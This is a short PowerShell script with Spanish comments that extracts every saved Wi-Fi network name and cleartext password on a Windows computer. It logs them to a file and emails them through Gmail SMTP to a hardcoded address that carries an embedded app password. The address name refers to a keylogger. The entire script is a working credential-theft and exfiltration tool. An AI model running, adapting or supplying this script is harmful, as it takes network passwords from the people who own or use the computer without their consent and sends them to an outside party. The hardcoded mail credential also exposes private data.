# Extrae los perfiles de Wi-Fi
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Trim().Split(":")[1] }

# Configura el correo para enviar los datos (ajusta con tu correo y contraseña de aplicación)
$emailAddress = "prueba.el.para.keylogger@gmail.com"
$emailPassword = "aeud fdfz czxk wols"  # Contraseña de aplicación de Gmail
$log = ""

# Itera sobre cada perfil de Wi-Fi
foreach ($profile in $wifiProfiles) {
    $newProfile = $profile.Trim()
    $password = (netsh wlan show profile name=$newProfile key=clear | Select-String "Key Content").ToString().Trim().Split(":")[1]
    Write-Host "SSID: $newProfile" -ForegroundColor Green
    Write-Host "Password: $password" -ForegroundColor Green
    Write-Host ""

    # Agrega los datos al log
    $log += "Computer Name: $env:COMPUTERNAME`n"
    $log += "SSID: $newProfile`n"
    $log += "Password: $password`n`n"
}

# Guarda los datos en un archivo local
$logFile = "wifi_passwords_log.txt"
$log | Out-File -FilePath $logFile

# Envía el log por correo
try {
    $server = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", 587)
    $server.EnableSsl = $true
    $server.Credentials = New-Object System.Net.NetworkCredential($emailAddress, $emailPassword)
    $message = New-Object System.Net.Mail.MailMessage($emailAddress, $emailAddress, "Wi-Fi Passwords from $env:COMPUTERNAME", $log)
    $server.Send($message)
    Write-Host "Successfully sent Wi-Fi passwords to email" -ForegroundColor Green
}
catch {
    Write-Host "Failed to send Wi-Fi passwords to email: $_" -ForegroundColor Red
}
